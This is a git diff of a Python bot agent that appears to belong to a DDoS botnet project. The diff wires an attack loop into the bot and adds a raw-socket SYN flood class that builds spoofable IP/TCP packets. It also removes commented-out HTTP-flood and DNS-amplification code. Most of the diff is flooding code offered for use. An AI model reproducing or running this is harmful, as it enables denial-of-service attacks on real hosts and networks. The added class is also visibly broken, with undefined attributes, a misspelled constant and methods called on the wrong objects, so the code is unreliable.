@@ -5,6 +5,7 @@ import http.client
 import argparse
 import threading
 from random import *
+import time
 
 RECV_BUFFER = 4096
 ENCODING = 'utf-8'
@@ -114,7 +115,10 @@ class Bot():
 			attack.run()
 
 		
-	#def attack2(self, host, port):
+	def attack2(self, host, port):
+                attack2 = SynFloodAttack(self.target_address, self.ip)
+                while self.attacking == True:
+                        attack2.run()
 		#spoof source IP? fake_ip()p
 
 		#do attack on host:port
@@ -191,83 +195,110 @@ class RequestAttack():
 			
 ''' End of referenced code'''
 
-# https://www.neuralnine.com/code-a-ddos-script-in-python/
-## this one is just a ddos
-'''class myAttack1 ():
 
-    target = '192.168.0.12' #mine
-    fake_ip = '182.21.20.32'
-    port = 80
+''' Original code from: Author: ___T7hM1___ Github: http://github.com/t7hm1/pyddos   '''
 
-    
-    
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((target, port))
-        sock.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-        sock.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-        sock.close()
+class SynFloodAttack():
+	def __init__(self,target,ip):
+		Thread.__init__(self)
+		self.target = target
+		self.ip = ip
+		self.psh = ''
+		
+	def checksum(self):
+		s = 0
 
-    for i in range(500):
-    thread = threading.Thread(target=attack)
-    thread.start()'''
+		# loop through 2 characters at a time
+		for i in range(0,len(self.psh),2):
+			w = ((self.psh[i]) << 8) + ((self.psh[i+1]))
+			s = s + w
 
-# https://gist.github.com/thom-s/7b3fcdcb88c0670167ccdd6ebca3c924
-## this one is an amplification ddos
-'''
-# Imports
-from scapy.all import *
-from pprint import pprint
-import operator
+		s = (s>>16) + (s & 0xffff)
 
-# Parameters
-interface = "eth0"                      # Interface you want to use
-dns_source = "local-ip"                 # IP of that interface
-dns_destination = ["ip1","ip2","ip3"]   # List of DNS Server IPs
+		# compliment and mask to 4 byte short
+		s = ~s & 0xffff
 
-time_to_live = 128                                                                 # IP TTL 
-query_name = "google.com"                                                          # DNS Query Name
-query_type = ["ANY", "A","AAAA","CNAME","MX","NS","PTR","CERT","SRV","TXT", "SOA"] # DNS Query Types
+		return s
+	    
+	def Building_packet(self):
+                #ip header fields
+		ihl = 5
+		version = 4
+		tos = 0
+		tot = 40
+		id = 54321  #id of this packet
+		frag_off = 0
+		ttl = 64 #255
+		protocol = IPPROTO_TCP  #socket
+		check = 10
+		s_addr = inet_aton(self.ip) #socket -- this can be spoofed
+		d_addr= inet_aton(self.target) #socket
 
-# Initialise variables
-results = []
-packet_number=0
+		ihl_version = (version << 4) + ihl
+                #the ! in the pack format string means network order
+		ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)
 
-# Loop through all query types then all DNS servers
-for i in range(0,len(query_type)):
-    for j in range(0, len(dns_destination)):
-        packet_number += 1
+                #tcp header fields
+		source = 54321 #source port -- 1234
+		dest = 80      #destination port
+		seq = 0
+		ack_seq = 0
+		doff = 5       #4 bit field, size of tcp header, 5 * 4 = 20 bytes
+                #tcp flags
+		fin = 0
+		syn = 1
+		rst = 0
+		ack = 0
+		psh = 0
+		urg = 0
+		window = htons(5840)  #socket -- maximum allowed window size
+		check = 0
+		urg_prt = 0
 
-        # Craft the DNS query packet with scapy
-        packet = IP(src=dns_source, dst=dns_destination[j], ttl=time_to_live) / UDP() / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type[i]))
-        
-        # Sending the packet
-        try:
-            query = sr1(packet,iface=interface,verbose=False, timeout=8)
-            print("Packet #{} sent!".format(packet_number))
-        except:
-            print("Error sending packet #{}".format(packet_number))
-        
-        # Creating dictionary with received information
-        try:
-            result_dict = {
-                'dns_destination':dns_destination[j],
-                'query_type':query_type[i],
-                'query_size':len(packet),
-                'response_size':len(query),
-                'amplification_factor': ( len(query) / len(packet) ),
-                'packet_number':packet_number
-            }
-            results.append(result_dict)
-        except:
-            pass
+		offset_res = (doff << 4)
+		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
 
-# Sort dictionary by the amplification factor
-results.sort(key=operator.itemgetter('amplification_factor'),reverse=True)
+                # the ! in the pack format string means network order
+		tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)
 
-# Print results
-pprint(results)'''
-			
+                #pseudo header fields
+		src_addr = inet_aton(self.ip) #socket
+		dst_addr = inet_aton(self.target) #socket
+		placeholder = 0
+		protocol = IPPROTO_TCP #socket
+		tcp_length = len(tcp_header)
+
+		self.psh = pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol,tcp_length);
+		self.psh = self.psh + tcp_header;
+
+		tcp_checksum = self.checksum()
+
+                # make the tcp header again and fill in the correct checksum
+		tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_prt)
+
+                #final full packet - syn packets do not have any data
+		packet = ip_header + tcp_header
+
+		return packet
+
+	def run(self):
+                sock = self.socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
+                sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
+                #tell kernel not to put in headers since we are providing it
+                self.checksum().setsockopt(socket.IPPRONTO_IP, socket.IP_HDRINCL, 1)
+		packet=self.Building_packet()
+		try:
+			self.lock.acquire()
+			self.sock.sendto(packet,(self.target,0))
+		except KeyboardInterrupt:
+			sys.exit(print('Canceled by user'))
+		except Exception as e:
+			print(e)
+		finally:
+			self.lock.release()
+			sys.exit()
+''' end of referenced code '''
+
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser(description = 'Bot Agent')
 	parser.add_argument('host', help='Interface the Bot connects to')
